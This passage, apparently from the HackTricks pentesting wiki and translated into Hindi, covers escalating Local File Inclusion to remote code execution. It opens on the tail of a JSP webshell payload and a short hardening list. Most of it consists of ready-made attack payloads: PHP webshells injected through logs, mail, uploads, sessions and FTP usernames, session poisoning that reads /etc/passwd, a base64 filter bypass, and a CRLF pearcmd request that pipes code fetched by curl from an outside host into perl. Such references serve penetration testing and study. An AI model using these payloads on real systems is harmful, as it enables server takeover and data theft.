try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening that defeats this class of bugs:
- canonical path पर रिज़ॉल्व करें और सुनिश्चित करें कि यह allow-listed base directory की सबडायरेक्टरी है।
- किसी भी path को रिजेक्ट करें जिसमें `..`, absolute roots, या drive letters हों; generated filenames को प्राथमिकता दें।
- writer को low-privileged account के रूप में चलाएँ और write directories को served roots से अलग रखें।

## Remote File Inclusion

पहले समझाया गया है, [**follow this link**](#remote-file-inclusion).

### Apache/Nginx लॉग फ़ाइल के माध्यम से

यदि Apache या Nginx सर्वर include function के अंदर **vulnerable to LFI** है, तो आप कोशिश कर सकते हैं कि **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`** तक पहुँचें, **user agent** या किसी **GET parameter** में एक php shell जैसे **`<?php system($_GET['c']); ?>`** सेट करें और उस फ़ाइल को include करें

> [!WARNING]
> ध्यान दें कि **if you use double quotes** shell के लिए **simple quotes** की बजाय, double quotes string "_**quote;**_" में बदल दिए जाएंगे, **PHP वहां एक error फेंकेगा** और **कुछ भी execute नहीं होगा**।
>
> साथ ही, सुनिश्चित करें कि आप **payload को सही तरीके से लिखते हैं** वरना PHP हर बार लॉग फ़ाइल लोड करने की कोशिश में error देगा और आपको दूसरी अवसर नहीं मिलेगा।

यह अन्य लॉग्स में भी किया जा सकता है लेकिन **सावधान रहें,** लॉग्स के अंदर का कोड URL encoded हो सकता है और इससे Shell नष्ट हो सकती है। header **authorisation "basic"** में Base64 में "user:password" होता है और यह लॉग्स के अंदर decode हो जाता है। PHPShell को इस header के अंदर insert किया जा सकता है.\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### ईमेल के माध्यम से

**एक मेल भेजें** किसी आंतरिक खाते (user@localhost) पर जिसमें आपका PHP payload जैसे `<?php echo system($_REQUEST["cmd"]); ?>` हो और उपयोगकर्ता के मेल को ऐसे पाथ से include करने की कोशिश करें: **`/var/mail/<USERNAME>`** या **`/var/spool/mail/<USERNAME>`**

### /proc/\*/fd/\* के माध्यम से

1. कई shells अपलोड करें (उदाहरण के लिए: 100)
2. इस URL को include करें [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), जहाँ $PID = प्रोसेस का PID (यह brute force किया जा सकता है) और $FD फाइल descriptor है (यह भी brute force किया जा सकता है)

### /proc/self/environ के माध्यम से

एक लॉग फ़ाइल की तरह, payload को User-Agent में भेजें; यह /proc/self/environ फ़ाइल में परिलक्षित होगा
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### अपलोड के जरिए

यदि आप फ़ाइल अपलोड कर सकते हैं, तो उसमें बस shell payload inject कर दें (उदा.: `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
फ़ाइल को पढ़ने योग्य बनाए रखने के लिए, सबसे अच्छा है कि चित्रों/doc/pdf के metadata में इंजेक्ट किया जाए

### ZIP फ़ाइल अपलोड के माध्यम से

एक ZIP फ़ाइल अपलोड करें जिसमें संपीड़ित PHP shell हो और एक्सेस करें:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP sessions के माध्यम से

जाँच करें कि वेबसाइट PHP Session (PHPSESSID) का उपयोग करती है या नहीं
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP में ये sessions _/var/lib/php5/sess\\_\[PHPSESSID]\_ files में स्टोर होते हैं
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
कुकी को `<?php system('cat /etc/passwd');?>` पर सेट करें
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFI का उपयोग करके PHP session फ़ाइल को शामिल करें
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

यदि ssh सक्रिय है तो जाँचें कौन सा user उपयोग किया जा रहा है (/proc/self/status & /etc/passwd) और कोशिश करें **\<HOME>/.ssh/id_rsa** तक पहुँचने की।

### **Via** **vsftpd** _**logs**_

FTP server vsftpd के logs _**/var/log/vsftpd.log**_ पर स्थित हैं। ऐसी स्थिति में जहाँ Local File Inclusion (LFI) vulnerability मौजूद है और exposed vsftpd server तक पहुँच संभव है, निम्नलिखित कदम लागू किए जा सकते हैं:

1. लॉगिन प्रक्रिया के दौरान username फ़ील्ड में PHP payload inject करें।
2. Injection के बाद, LFI का उपयोग करके सर्वर लॉग्स _**/var/log/vsftpd.log**_ प्राप्त करें।

### Via php base64 filter (using base64)

जैसा कि [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article में दिखाया गया है, PHP base64 filter सिर्फ Non-base64 को ignore कर देता है। आप इसका उपयोग file extension check bypass करने के लिए कर सकते हैं: अगर आप ऐसा base64 प्रदान करते हैं जो ".php" पर खत्म होता है, तो यह "." को अनदेखा कर देगा और base64 के साथ "php" जोड़ देगा। यहाँ एक उदाहरण payload है:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### php filters के माध्यम से (no file needed)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)समझाता है कि आप **php filters to generate arbitrary content** का उपयोग आउटपुट के रूप में कर सकते हैं। जिसका मूलतः अर्थ यह है कि आप include के लिए **generate arbitrary php code** कर सकते हैं **without needing to write** it into a file.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### segmentation fault के माध्यम से

एक फाइल अपलोड करें जो `/tmp` में temporary के रूप में स्टोर होगी, फिर उसी request में एक segmentation fault ट्रिगर करें, और तब temporary फाइल हटाई नहीं जाएगी और आप उसे खोज सकते हैं।


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Nginx temp file storage के माध्यम से

यदि आप एक **Local File Inclusion** पाते हैं और **Nginx** PHP के सामने चल रहा है तो आप निम्न तकनीक से RCE प्राप्त कर सकते हैं:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### PHP_SESSION_UPLOAD_PROGRESS के माध्यम से

यदि आप एक **Local File Inclusion** पाते हैं भले ही आपके पास **don't have a session** हो और `session.auto_start` `Off` हो। यदि आप **`PHP_SESSION_UPLOAD_PROGRESS`** को **multipart POST** डेटा में प्रदान करते हैं, PHP आपके लिए **enable the session for you** करेगा। आप इसका दुरुपयोग करके RCE प्राप्त कर सकते हैं:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Windows में temp file uploads के माध्यम से

यदि आप एक **Local File Inclusion** पाते हैं और सर्वर **Windows** पर चल रहा है तो आप RCE प्राप्त कर सकते हैं:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### `pearcmd.php` + URL args के माध्यम से

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), स्क्रिप्ट `/usr/local/lib/phppearcmd.php` php docker images में डिफ़ॉल्ट रूप से मौजूद रहती है। इसके अलावा, स्क्रिप्ट को URL के माध्यम से arguments पास करना संभव है क्योंकि बताया गया है कि यदि किसी URL param में `=` नहीं है, तो उसे argument के रूप में उपयोग किया जाना चाहिए। देखिए भी [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) और [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)।

निम्न request `/tmp/hello.php` में कंटेंट `<?=phpinfo()?>` वाली एक फ़ाइल बनाएगा:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
निम्नलिखित CRLF vuln का दुरुपयोग करके RCE प्राप्त करता है (स्रोत: [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo() के जरिए (file_uploads = on)

यदि आपने **Local File Inclusion** पाया है और एक फाइल जो **phpinfo()** दिखाती है जिसमें file_uploads = on है, तो आप RCE प्राप्त कर सकते हैं:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure के जरिए

यदि आपने **Local File Inclusion** पाया है और आप temp file का **can exfiltrate the path** कर सकते हैं, लेकिन **server** **checking** कर रहा है कि **file to be included has PHP marks**, तो आप इस **Race Condition** के साथ उस जांच को **bypass that check** करने की कोशिश कर सकते हैं:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### eternal waiting + bruteforce के जरिए

यदि आप LFI का दुरुपयोग करके **upload temporary files** कर सकते हैं और server को PHP execution **hang** करवा सकते हैं, तो आप घंटों तक नामों को **brute force filenames during hours** करके temporary file ढूंढ सकते हैं:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Fatal Error तक

यदि आप किसी भी फ़ाइल को शामिल करते हैं `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (उस त्रुटि को फेंकने के लिए आपको उसी one को 2 बार include करना होगा).

**मुझे नहीं पता कि यह कैसे उपयोगी है पर हो सकता है।**\
_भले ही आप PHP Fatal Error पैदा कर दें, PHP द्वारा upload की गई temporary files हटा दी जाती हैं._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
